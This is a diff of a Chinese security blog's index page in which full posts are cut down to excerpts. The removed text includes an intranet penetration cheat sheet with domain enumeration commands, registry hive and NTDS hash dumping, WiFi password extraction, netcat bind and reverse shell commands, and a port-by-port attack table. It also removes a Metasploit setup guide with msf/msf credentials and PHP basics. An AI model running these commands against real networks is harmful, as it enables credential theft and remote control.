@@ -333,230 +333,23 @@
       
         
           
-            <h3 id="内网渗透基础知识"><a href="#内网渗透基础知识" class="headerlink" title="内网渗透基础知识"></a>内网渗透基础知识</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
-<p>了解一下内网的ip分配。。。。。。<br></p>
-</blockquote>
-<blockquote>
-<p>内网常用的三种ip：<br><br>A类 10.0.0.0–10.255.255.255<br><br>B类 172.16.0.0–172.31.255.255<br><br>C类 192.168.0.0–192.168.255.255<br></p>
-</blockquote>
-<p><strong>什么是域控制器</strong><br></p>
-<blockquote>
-<p>域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器（Domain Controller，简写为DC） <br></p>
-</blockquote>
-<blockquote>
-<p>在域中拥有最高权限，它能对域中的所有计算机进行操作和管理。</p>
-</blockquote>
-<h4 id="一、内网中常用的系统命令"><a href="#一、内网中常用的系统命令" class="headerlink" title="一、内网中常用的系统命令"></a>一、内网中常用的系统命令</h4><p><strong>1.内网网络探测常用命令</strong><br></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">tracert IP    //路由跟踪 </span><br><span class="line">route print    //打印路由表 </span><br><span class="line">arp -a          //列出本网段内所有活跃的IP地址 </span><br><span class="line">arp -s (ip + mac) //绑定mac与ip地址 </span><br><span class="line">arp -d (ip + mac) //解绑mac与ip地址 </span><br><span class="line">nbtscan -r 192.168.16.0/24  //通过小工具nbtscan扫描整个网络 </span><br><span class="line">netsh firewall show config    //查看防火墙策略 </span><br><span class="line">netsh firewall show state     //查看防火墙策略</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.10.%i -w 1 -n 1 | find /i &quot;ttl&quot; //探测存活主机</span><br></pre></td></tr></table></figure>
-<p><strong>2.windows操作命令</strong><br></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">net group /domain                          //获得所有域用户组列表</span><br><span class="line">net group xxx /domain              //显示域中xxx组</span><br><span class="line">net group xxx /del /domain         //删除域中xxx组</span><br><span class="line">net group xxx nx /del /domain      //删除域内xxx组中的成员nx</span><br><span class="line">net group xxx /add /domain         //添加域中的群组xxx</span><br><span class="line">net group &quot;domain admins&quot; /domain  //获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain //获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain //获得域内置administrators组用户</span><br><span class="line">net group &quot;domain controllers&quot; /domain //获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot; /domain //获得所有域成员计算机列表</span><br><span class="line">net user /domain   //获得所有域用户列表</span><br><span class="line">net user xxx /domain //获得账户xxx的详细信息</span><br><span class="line">net accounts /domain //获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">net view /domain     //查询有几个域，查询域列表</span><br><span class="line">net view /domain:xxx //查看xxx域中的计算机列表</span><br><span class="line">nltest /domain_trusts  //获取域信任信息</span><br><span class="line">net user domain-admin /domain //查看域管理员登录时间，密码过期时间，是否有登录脚本，组分配等信息</span><br><span class="line">net config workstation  //查询机器属于哪个域</span><br><span class="line">net time /domain     //查询主域服务器的时间</span><br><span class="line">echo %logonserver%   //查看登入到这台服务器的计算机名</span><br><span class="line">net time \\192.168.1.1  //查询远程共享主机192.168.1.1的时间</span><br><span class="line">net use \\ip\ipc$ password /user:username@domain //ipc$域内连接</span><br><span class="line">net view \\xxx.ggg.com  //查看域控共享情况</span><br><span class="line">dir \\dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt  //列出sysvol日志记录 </span><br><span class="line">xcopy \\dc2.backlion.com\sysvol.txt sysvol.txt  /i  /e  /c//远程拷贝到本地sysvol日志 </span><br><span class="line">net user  /domain  bk bk123                 //修改域内用户密码，需要管理员权限 </span><br><span class="line">net  localgroup  administartors   SEZKL\backlion  /add     //将SEZKL域中的用户backlion添加到administrators组中 </span><br><span class="line">mstsc /admin                 //远程桌面登录到console会话解决hash无法抓出问题 </span><br><span class="line">gpupdate/force                  //更新域策略 </span><br><span class="line">psexec  \\192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u //从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来 </span><br><span class="line">gsecdump  -a      //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值 </span><br><span class="line">tasklist /S ip /U domain\username /P /V    //查看远程计算机进程列</span><br></pre></td></tr></table></figure>
-<p>普通域用户提升为域管理员:<br><code>net group &quot;Domain Admins&quot; xxx /add /domain</code><br></p>
-<p><strong>3.基本内网渗透命令</strong><br></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all  //查看ip地址</span><br><span class="line">ipconfig /release //释放地址</span><br><span class="line">ipconfig /renew  //重新获取ip地址</span><br><span class="line">whoami  //查询账号用户名</span><br><span class="line">whoami /all  //查看sid值</span><br><span class="line">systeminfo  //查询系统以及补丁信息</span><br><span class="line">tasklist /svc  //查看进程</span><br><span class="line">taskkill /im 进程名称(cmd)  //结束进程</span><br><span class="line">taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">wmic qfe get hotfixid  //查看已安装的补丁</span><br><span class="line">wmic qfe list full /format:htable &gt; hotfixes.htm //详细的补丁安装</span><br><span class="line">wmic qfe     //查询补丁信息以及微软提供的下载地址</span><br><span class="line">net start    //查看当前运行的服务</span><br><span class="line">net user     //查看本地组的用户</span><br><span class="line">net localgroup administrators  //查看本机管理员组有哪些用户</span><br><span class="line">net use   //查看会话</span><br><span class="line">net session  //查看当前会话</span><br><span class="line">net share    //查看SMB指向的路径[即共享]</span><br><span class="line">wmic share get name,path   //查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置 </span><br><span class="line">net use \\IP\ipc$  password  /user:username      //建立IPC会话（工作组模式） </span><br><span class="line">net use  z:  \\192.168.1.1      //建立映射到本机Z盘 </span><br><span class="line">net time \\172.16.16.2        //查询共享主机的是 </span><br><span class="line">at \\172.16.16.2 13:50 c:\windows\2009.exe      //在共享主机上执行 </span><br><span class="line">netstat  -ano      //查看开放的端口 </span><br><span class="line">netstat -an | find “3389”   //找到3389端口 </span><br><span class="line">net accounts      //查看本地密码策略 </span><br><span class="line">nbtstat –A ip      //netbiso查询 </span><br><span class="line">net view      //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来 </span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%        //查看系统是32还是64位   </span><br><span class="line">set                              //查看系统环境设置变量 </span><br><span class="line">net start                     //查看当前运行的服务 </span><br><span class="line">wmic service list brief             //查看进程服务 </span><br><span class="line">wmic process list brief         //查看进程 </span><br><span class="line">wmic startup list brief       //查看启动程序信息 </span><br><span class="line">wmic product list brief           //查看安装程序和版本信息（漏洞利用线索） </span><br><span class="line">wmic startup list full         //识别开机启动的程序 </span><br><span class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt;mysql.log  //获取软件安装路径 </span><br><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&apos;netsh wlan showprofiles&apos;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %jkey=clear  //一键获取wifi密码 </span><br><span class="line">if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell) //查看是否支持posershell </span><br><span class="line">qwinsta                       //查看登录情况</span><br><span class="line">set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;set KB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;set KB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;set KB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;set KB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt|@find /i &quot;%i&quot;||@echo %%i% Not Installed!)&amp;del /f/q /a a.txt //windows未打补丁情况</span><br></pre></td></tr></table></figure>
-<p><strong>4.导出注册表的命令</strong><br></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive &amp; reg save hklm\system system.hive &amp; reg save hklm\security security.hive</span><br></pre></td></tr></table></figure>
-<h4 id="二、内网测试中代理与端口转发"><a href="#二、内网测试中代理与端口转发" class="headerlink" title="二、内网测试中代理与端口转发"></a>二、内网测试中代理与端口转发</h4><p><strong>正向代理</strong><br><br><code>Lhost ——&gt; proxy ——&gt; Rhost</code><br><br><img src="/2019/08/26/内网渗透基础知识/poxy.png" alt="正向代理"></p>
-<p><strong>反向代理</strong><br><br><code>Lhost &lt;——&gt; proxy &lt;——&gt; firewall &lt;——&gt; Rhost</code><br><br><img src="/2019/08/26/内网渗透基础知识/poxy2.png" alt="反向代理"></p>
-<p><strong>windows lcx端口转发</strong><br></p>
-<p>lcx常用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1: -listen &lt;ConnectPort1&gt; &lt;TransmitPort2&gt;</span><br><span class="line">监听p1,接收由p2转发过来的数据 </span><br><span class="line">2: -tarn &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;</span><br><span class="line">端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信</span><br><span class="line">3: -slave &lt;TransmitHostB&gt; &lt;PortB&gt; &lt;TransmitHostA&gt; &lt;PortA&gt; </span><br><span class="line">端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</span><br></pre></td></tr></table></figure></p>
-<p>内网上执行：<br><code>lcx.exe –slave 192.168.100.101 8888 192.168.100.111 3389</code></p>
-<p><strong>NC反弹CMDshell(netcat)</strong><br></p>
-<blockquote>
-<p>靶机上输入：<br><code>nc.exe -l -p 8888 -e cmd.exe</code><br>将cmd.exe转发到8888端口</p>
-</blockquote>
-<blockquote>
-<p>攻击机输入：<br><code>nc.exe -nvv 192.168.100.101 8888</code><br>连接到靶机的8888端口(获取cmd.exe的执行权限)</p>
-</blockquote>
-<p><strong>反向连接：</strong></p>
-<blockquote>
-<p>攻击机输入：<br><code>nc.exe -l -p 8888</code><br>监听本地8889端口</p>
-</blockquote>
-<blockquote>
-<p>靶机上输入：<br><code>nc.exe -e cmd.exe 192.168.100.100 8888</code><br>将靶机的cmd.exe转发到攻击机的8889端口</p>
-</blockquote>
-<h4 id="三、端口与服务"><a href="#三、端口与服务" class="headerlink" title="三、端口与服务"></a>三、端口与服务</h4><table>
-<thead>
-<tr>
-<th style="text-align:center">端口号</th>
-<th style="text-align:center">端口说明</th>
-<th style="text-align:center">攻击技巧</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">21/22/69</td>
-<td style="text-align:center">ftp/tftp：文件传输协议</td>
-<td style="text-align:center">爆破\嗅探\溢出\后门</td>
-</tr>
-<tr>
-<td style="text-align:center">22</td>
-<td style="text-align:center">ssh：远程连接</td>
-<td style="text-align:center">爆破OpenSSH；28个退格</td>
-</tr>
-<tr>
-<td style="text-align:center">23</td>
-<td style="text-align:center">telnet：远程连接</td>
-<td style="text-align:center">爆破\嗅探</td>
-</tr>
-<tr>
-<td style="text-align:center">25</td>
-<td style="text-align:center">smtp：邮件服务</td>
-<td style="text-align:center">邮件伪造</td>
-</tr>
-<tr>
-<td style="text-align:center">53</td>
-<td style="text-align:center">DNS：域名系统</td>
-<td style="text-align:center">DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
-</tr>
-<tr>
-<td style="text-align:center">67/68</td>
-<td style="text-align:center">dhcp</td>
-<td style="text-align:center">劫持\欺骗</td>
-</tr>
-<tr>
-<td style="text-align:center">110</td>
-<td style="text-align:center">pop3</td>
-<td style="text-align:center">爆破</td>
-</tr>
-<tr>
-<td style="text-align:center">139</td>
-<td style="text-align:center">samba</td>
-<td style="text-align:center">爆破\未授权访问\远程代码执行</td>
-</tr>
-<tr>
-<td style="text-align:center">143</td>
-<td style="text-align:center">imap</td>
-<td style="text-align:center">爆破</td>
-</tr>
-<tr>
-<td style="text-align:center">161</td>
-<td style="text-align:center">snmp</td>
-<td style="text-align:center">爆破</td>
-</tr>
-<tr>
-<td style="text-align:center">389</td>
-<td style="text-align:center">ldap</td>
-<td style="text-align:center">注入攻击\未授权访问</td>
-</tr>
-<tr>
-<td style="text-align:center">512/513/514</td>
-<td style="text-align:center">linux r</td>
-<td style="text-align:center">直接使用rlogin</td>
-</tr>
-<tr>
-<td style="text-align:center">873</td>
-<td style="text-align:center">rsync</td>
-<td style="text-align:center">未授权访问</td>
-</tr>
-<tr>
-<td style="text-align:center">1080</td>
-<td style="text-align:center">socket</td>
-<td style="text-align:center">爆破：进行内网渗透</td>
-</tr>
-<tr>
-<td style="text-align:center">1352</td>
-<td style="text-align:center">lotus</td>
-<td style="text-align:center">爆破：弱口令\信息泄漏：源代码</td>
-</tr>
-<tr>
-<td style="text-align:center">1433</td>
-<td style="text-align:center">mssql</td>
-<td style="text-align:center">爆破：使用系统用户登录\注入攻击</td>
-</tr>
-<tr>
-<td style="text-align:center">1521</td>
-<td style="text-align:center">oracle</td>
-<td style="text-align:center">爆破：TNS\注入攻击</td>
-</tr>
-<tr>
-<td style="text-align:center">2049</td>
-<td style="text-align:center">nfs</td>
-<td style="text-align:center">配置不当</td>
-</tr>
-<tr>
-<td style="text-align:center">2181</td>
-<td style="text-align:center">zookeeper</td>
-<td style="text-align:center">未授权访问</td>
-</tr>
-<tr>
-<td style="text-align:center">3306</td>
-<td style="text-align:center">mysql</td>
-<td style="text-align:center">爆破\拒绝服务\注入</td>
-</tr>
-<tr>
-<td style="text-align:center">3389</td>
-<td style="text-align:center">rdp</td>
-<td style="text-align:center">爆破\Shift后门\0708</td>
-</tr>
-<tr>
-<td style="text-align:center">4848</td>
-<td style="text-align:center">glassfish</td>
-<td style="text-align:center">爆破：控制台弱口令\认证绕过</td>
-</tr>
-<tr>
-<td style="text-align:center">5000</td>
-<td style="text-align:center">sybase/DB2</td>
-<td style="text-align:center">爆破\注入</td>
-</tr>
-<tr>
-<td style="text-align:center">5432</td>
-<td style="text-align:center">postgresql</td>
-<td style="text-align:center">缓冲区溢出\注入攻击\爆破：弱口令</td>
-</tr>
-<tr>
-<td style="text-align:center">5632</td>
-<td style="text-align:center">pcanywhere</td>
-<td style="text-align:center">拒绝服务\代码执行</td>
-</tr>
-<tr>
-<td style="text-align:center">5900</td>
-<td style="text-align:center">vnc</td>
-<td style="text-align:center">爆破：弱口令\认证绕过</td>
-</tr>
-<tr>
-<td style="text-align:center">6379</td>
-<td style="text-align:center">redis</td>
-<td style="text-align:center">未授权访问\爆破：弱口令</td>
-</tr>
-<tr>
-<td style="text-align:center">7001</td>
-<td style="text-align:center">weblogic</td>
-<td style="text-align:center">Java反序列化\控制台弱口令\控制台部署webshell</td>
-</tr>
-<tr>
-<td style="text-align:center">80/443/8080</td>
-<td style="text-align:center">web</td>
-<td style="text-align:center">常见web攻击\控制台爆破\对应服务器版本漏洞</td>
-</tr>
-<tr>
-<td style="text-align:center">8069</td>
-<td style="text-align:center">zabbix</td>
-<td style="text-align:center">远程命令执行</td>
-</tr>
-<tr>
-<td style="text-align:center">9090</td>
-<td style="text-align:center">websphere控制台</td>
-<td style="text-align:center">爆破：控制台弱口令\Java反序列</td>
-</tr>
-<tr>
-<td style="text-align:center">9200/9300</td>
-<td style="text-align:center">elasticsearch</td>
-<td style="text-align:center">远程代码执行</td>
-</tr>
-<tr>
-<td style="text-align:center">11211</td>
-<td style="text-align:center">memcacache</td>
-<td style="text-align:center">未授权访问</td>
-</tr>
-<tr>
-<td style="text-align:center">27017</td>
-<td style="text-align:center">mongodb</td>
-<td style="text-align:center">爆破\未授权访问</td>
-</tr>
-</tbody>
-</table>
+          内网渗透基础知识前言
+了解一下内网的ip分配。。。。。。
 
-          
+
+内网常用的三种ip：A类 10.0.0.0–10.255.255.255B类 172.16.0.0–172.31.255.255C类 192.168.0.0–192.168.255.255
+
+什么是域控制器
+
+域控制器是指在“域”模式下，
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/26/内网渗透基础知识/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -674,29 +467,16 @@
       
         
           
-            <h3 id="centos安装msf的一个笔记"><a href="#centos安装msf的一个笔记" class="headerlink" title="centos安装msf的一个笔记"></a>centos安装msf的一个笔记</h3><p>以前都是使用kali的msf，没有自己安装过，现在我使用centos系统，了解一些安装过程。百度了一下安装的教程，跟着操作了一下。有一些坑。</p>
-<h4 id="第一步、下载包"><a href="#第一步、下载包" class="headerlink" title="第一步、下载包"></a>第一步、下载包</h4><p><code>wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run</code><br></p>
-<p>给予这个包执行的权限：<br><br><code>chmod +x metasploit-latest-linux-x64-installer.run</code><br></p>
-<p>运行这个文件<code>./metasploit-latest-linux-x64-installer.run</code><br><br>之后基本回车就可以，有选择y/n的选y。<br><img src="/2019/08/19/centos安装msf/msf.png" alt="1231"></p>
-<h4 id="第二步、安装postgresql"><a href="#第二步、安装postgresql" class="headerlink" title="第二步、安装postgresql"></a>第二步、安装postgresql</h4><p>由于msf需要使用postgresql，所以需要安装并配置它。这里是真的坑。搞得我还原了几次系统。</p>
-<p>首先安装postgresql-server这个包：<br><code>yum install -y postgresql-server</code><br>安装完就开始配置了<br><strong>初始化数据库:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# postgresql-setup initdb</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# su - postgres</span><br><span class="line"></span><br><span class="line">-bash-4.2$ whoami</span><br><span class="line">postgres</span><br><span class="line"></span><br><span class="line">-bash-4.2$ pg_ctl -D /var/lib/pgsql/data start</span><br><span class="line">正在启动服务器进程</span><br><span class="line"></span><br><span class="line">-bash-4.2$ psql -p 5432</span><br><span class="line">psql (9.2.24)</span><br><span class="line">输入 &quot;help&quot; 来获取帮助信息.</span><br><span class="line"></span><br><span class="line">postgres=# \password postgres</span><br><span class="line">输入新的密码：</span><br><span class="line">再次键入：</span><br></pre></td></tr></table></figure>
-<p><strong>创建msf用户和msf数据库：</strong></p>
-<p>创建用户 msf，密码msf，数据库msf，赋予登入权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">postgres=# create user msf with password &apos;msf&apos;;</span><br><span class="line"></span><br><span class="line">postgres=# create database msf owner msf;</span><br><span class="line"></span><br><span class="line">postgres=# alter role msf login;</span><br></pre></td></tr></table></figure>
-<p><code>\q</code>可以退出postgresql命令。<br></p>
-<p><strong>修改配置文件 ，否则无法登录数据库：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# find / -name pg_hba.conf</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# vi /var/lib/pgsql/data/pg_hba.conf</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/08/19/centos安装msf/postgresql.png" alt="配置参数"></p>
-<p>【注意】现在必须重启数据库:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# su - postgres</span><br><span class="line">上一次登录：一 8月 19 12:52:51 CST 2019pts/0 上</span><br><span class="line"></span><br><span class="line">-bash-4.2$ pg_ctl -D /var/lib/pgsql/data restart</span><br></pre></td></tr></table></figure>
-<p>现在切换到root用户<br><br>使用这条命令查看新创建的用户是否可以连接数据库：<br></p>
-<p><code>[root@localhost ~]# psql -U msf -d msf -h 127.0.0.1 -p 5432</code><br>可以连接，进行下一步：<br></p>
-<p>查找msf的数据库配置文件，并修改配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# find / -name database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/ui/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-credential-2.0.14/spec/dummy/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit_data_models-2.0.17/spec/dummy/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-model-2.0.4/spec/dummy/config/database.yml.example</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# cp /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml.example /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# vi /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml</span><br></pre></td></tr></table></figure>
-<p>更改配置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">development: &amp;pgsql</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  database: msf</span><br><span class="line">  username: msf</span><br><span class="line">  password: msf</span><br><span class="line">  host: localhost</span><br><span class="line">  port: 5432</span><br><span class="line">  pool: 200</span><br><span class="line">  timeout: 5</span><br></pre></td></tr></table></figure></p>
-<p>完成配置，重启metasploit与postgresql 即可完成数据库配置<br><img src="/2019/08/19/centos安装msf/msf_db.png" alt="数据库状态"></p>
-
-          
+          centos安装msf的一个笔记以前都是使用kali的msf，没有自己安装过，现在我使用centos系统，了解一些安装过程。百度了一下安装的教程，跟着操作了一下。有一些坑。
+第一步、下载包wget https://downloads.metasploit.com/data/releases/meta
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/19/centos安装msf/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -814,43 +594,23 @@
       
         
           
-            <h3 id="foreach数组指针"><a href="#foreach数组指针" class="headerlink" title="foreach数组指针"></a>foreach数组指针</h3><blockquote>
-<p>1.指针其实也是一个变量，用来保存某个元素的地址。指针可以移动。<br>2.默认情况下，打开一个数组，指针会指向数组的第一个元素。<br><img src="https://i.imgur.com/EELmBAD.png" alt="1"><br>语法结构<code>foreach(数组 as 键=&gt;值){ 循环体 }</code></p>
-</blockquote>
-<blockquote>
-<p>流程图</p>
-</blockquote>
-<p><img src="https://i.imgur.com/tjkkLID.png" alt="2"></p>
-<blockquote>
-<p>foreach是循环，break和continue也适用于foreach循环<br><img src="https://i.imgur.com/sAL4pfe.png" alt="3"></p>
-</blockquote>
-<blockquote>
-<p>foreach值变量支持传地址<br><img src="https://i.imgur.com/thwPC7e.png" alt="4"><br><img src="https://i.imgur.com/VDWJHXh.png" alt="5"></p>
-</blockquote>
-<blockquote>
-<p><strong>注意：</strong>键变量不支持传地址。</p>
-</blockquote>
-<blockquote>
-<p>foreach循环变量数组的时候，遍历的是数组的拷贝<br><img src="https://i.imgur.com/LlP6QLr.png" alt="6"></p>
-</blockquote>
-<h3 id="数组指针的操作"><a href="#数组指针的操作" class="headerlink" title="数组指针的操作"></a>数组指针的操作</h3><blockquote>
-<p>1.key() —— 从关联数组中取得键名，没有取到返回NULL。<br>2.current() – 返回数组中的当前单元<br>3.next() —– 返回数组中的当前单元<br>4.prev() —– 将数组的内部指针倒回一位<br>5.reset() —- 将数组的内部指针指向第一个单元<br>6.end() —— 将数组的内部指针指向最后一个单元</p>
-</blockquote>
-<p>例题：将数组的元素从后往前取<br><img src="https://i.imgur.com/aO0WLgM.png" alt="7"></p>
-<blockquote>
-<p><strong>注意：</strong>如果一个数组连续输出两次，必须要将指针复位。</p>
-</blockquote>
-<h3 id="each-函数的使用"><a href="#each-函数的使用" class="headerlink" title="each()函数的使用"></a>each()函数的使用</h3><blockquote>
-<p>1.返回数组当前的键/值对并将数组指针向前移动一步，如果内部指针穿越了数组的末尾返回false</p>
-</blockquote>
-<blockquote>
-<p>2.键值对返回4个单元，其中包含索引数组和关联数组，下标是key和0的是键，下标是1和value的是值。<br>3.each()=key()+current()+next()<br>4.如果第二次再遍历，必须通过reset()复位指针。<br><img src="https://i.imgur.com/c7o9hC1.png" alt="1"></p>
-</blockquote>
-<blockquote>
-<p>通过while+each遍历数组<br><img src="https://i.imgur.com/7AFr5t8.png" alt="2"></p>
-</blockquote>
+          foreach数组指针
+1.指针其实也是一个变量，用来保存某个元素的地址。指针可以移动。2.默认情况下，打开一个数组，指针会指向数组的第一个元素。语法结构foreach(数组 as 键=&gt;值){ 循环体 }
 
-          
+
+流程图
+
+
+
+foreach是循环，break和continue也适用于forea
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/01/03/php数组指针foreach/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -968,50 +728,25 @@
       
         
           
-            <h3 id="用下标操作字符串"><a href="#用下标操作字符串" class="headerlink" title="[]用下标操作字符串"></a>[]用下标操作字符串</h3><blockquote>
-<p>字符串可以理解成字符集合，所以可以通过[]来访问。<strong>不能操作中文</strong>。<br><img src="https://i.imgur.com/mepWNf1.png" alt="1"></p>
-</blockquote>
-<h3 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h3><blockquote>
-<p>返回字符串长度，以字节为单位。<br><img src="https://i.imgur.com/RxPCzCv.png" alt="2"></p>
-</blockquote>
-<blockquote>
-<p><strong>注意：在gbk下一个汉字2个字节，在utf-8下一个汉字3个字节。</strong></p>
-</blockquote>
-<h3 id="trim-、ltrim-、rtrim-去除空白字符"><a href="#trim-、ltrim-、rtrim-去除空白字符" class="headerlink" title="trim()、ltrim()、rtrim():去除空白字符"></a>trim()、ltrim()、rtrim():去除空白字符</h3><ol>
-<li>trim():去字符串两边的把空格</li>
-<li>ltrim():去字符串左边的空格</li>
-<li>rtrim():去字符串右边的空格</li>
-</ol>
